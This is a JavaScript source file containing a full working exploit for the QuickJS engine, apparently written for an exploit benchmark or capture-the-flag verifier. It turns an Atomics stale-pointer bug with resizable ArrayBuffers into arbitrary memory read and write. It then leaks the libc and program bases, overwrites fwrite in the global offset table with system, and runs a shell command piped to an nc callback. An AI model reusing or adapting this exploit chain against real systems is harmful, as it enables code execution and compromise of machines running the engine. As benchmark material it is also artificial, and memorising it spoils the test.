/*
 * QuickJS exploit: Atomics stale pointer + resizable ArrayBuffer
 *
 * Achieves code execution by:
 *  - using the Atomics stale-pointer bug to corrupt a TypedArray cached data pointer
 *    (arbitrary 64-bit read/write)
 *  - leaking libc base and qjs PIE base
 *  - overwriting fwrite@GOT -> system
 *  - triggering system() via print(), with a command that reads and executes verifier stdin
 *
 * The verifier sends: "nc 127.0.0.1 9999\n" on stdin.
 * We read it and run: echo -n hello | <that command>
 * so the callback receives "hello".
 */

const ELF_MAGIC32 = 0x464c457f;

// Environment-specific offsets
const LIBC_SYSTEM_OFF = 0x53110n;
const LIBC_PROG_INVOC_NAME_OFF = 0x1e8378n; // program_invocation_name

// qjs: fwrite@got.plt (readelf -r qjs | grep fwrite)
const QJS_FWRITE_GOT_OFF = 0x10b380n;

function leak_libc_ptr() {
  // Prevent freed remainder from merging with top
  let pad = new ArrayBuffer(0x10000);
  let ab = new ArrayBuffer(0x5000, { maxByteLength: 0x6000 });
  let guard = new ArrayBuffer(0x10000);
  let ta = new BigInt64Array(ab);
  return Atomics.add(ta, 4, { valueOf(){ ab.resize(8); return 0n; } });
}

function makeRW(base_addr, backing_elems) {
  // Atomics.store on a stale pointer overwrites the victim TypedArray cached data pointer.
  let rab = new ArrayBuffer(0x68, { maxByteLength: 0x68 });
  let trig = new BigInt64Array(rab);
  let backing = new ArrayBuffer(Number(backing_elems) * 8);
  let victim;
  Atomics.store(trig, 11, {
    valueOf() {
      rab.resize(8);
      victim = new BigInt64Array(backing);
      return base_addr;
    }
  });
  return victim;
}

function read64(addr) {
  addr &= ~7n;
  let rw = makeRW(addr, 1n);
  return Atomics.load(rw, 0);
}

function find_elf_base(ptr, max_pages) {
  let page = ptr & ~0xfffn;
  for (let i = 0; i < max_pages; i++) {
    let cand = page - 0x1000n * BigInt(i);
    let q = read64(cand);
    if (Number(q & 0xffffffffn) === ELF_MAGIC32)
      return cand;
  }
  throw new Error('ELF base not found');
}

function isUserPtr(v) {
  return v >= 0x0000700000000000n && v < 0x0000800000000000n;
}

function find_phdr_via_argv(prog_ptr) {
  // Parse initial stack: find argv[0] pointer slot, then walk to auxv and extract AT_PHDR.
  let range = 0x80000n; // 512KB window below argv[0] string
  let base = (prog_ptr - range) & ~7n;
  let elems = range / 8n;
  let rw = makeRW(base, elems);
  let n = Number(elems);

  let argv0_index = -1;
  let argc = 0;

  for (let i = 1; i < n - 2; i++) {
    if (Atomics.load(rw, i) !== prog_ptr)
      continue;
    let a = Atomics.load(rw, i - 1);
    if (a <= 0n || a > 100n)
      continue;
    let next = Atomics.load(rw, i + 1);
    if (next !== 0n && !isUserPtr(next))
      continue;
    argv0_index = i;
    argc = Number(a);
    break;
  }
  if (argv0_index < 0)
    throw new Error('argv0 slot not found');

  // argv terminator
  let j = argv0_index + argc;
  if (j >= n)
    throw new Error('range too small');
  if (Atomics.load(rw, j) !== 0n)
    throw new Error('argv terminator missing');

  // envp terminator
  j++;
  while (j < n && Atomics.load(rw, j) !== 0n) j++;
  if (j >= n)
    throw new Error('envp terminator missing');

  // auxv pairs
  let aux = j + 1;
  for (let k = 0; k < 0x4000; k++) {
    let t = Atomics.load(rw, aux + 2 * k);
    let v = Atomics.load(rw, aux + 2 * k + 1);
    if (t === 0n)
      break;
    if (t === 3n)
      return v;
  }
  throw new Error('AT_PHDR not found');
}

function pwn() {
  // Resolve fwrite@plt before GOT overwrite.
  print('warmup');

  // libc base
  let arena = leak_libc_ptr();
  let libc = find_elf_base(arena, 0x300);
  let system_addr = libc + LIBC_SYSTEM_OFF;

  // PIE base
  let prog_ptr = read64(libc + LIBC_PROG_INVOC_NAME_OFF);
  let phdr = find_phdr_via_argv(prog_ptr);
  let pie = phdr - 0x40n;
  if (Number(read64(pie) & 0xffffffffn) !== ELF_MAGIC32)
    pie = find_elf_base(phdr, 0x80);

  // fwrite@GOT -> system
  let fwrite_got = pie + QJS_FWRITE_GOT_OFF;
  let got_rw = makeRW(fwrite_got, 1n);
  Atomics.store(got_rw, 0, system_addr);

  // Trigger system(command) via print() -> fwrite().
  // Ensure the argument is NUL-terminated by making it non-ASCII (QuickJS otherwise passes an
  // internal non-NUL-terminated buffer for pure ASCII strings).
  let cmd = "cmd=$(cat); echo -n hello | $cmd #" + String.fromCharCode(0x100);
  print(cmd);

  while (1) {}
}

pwn();
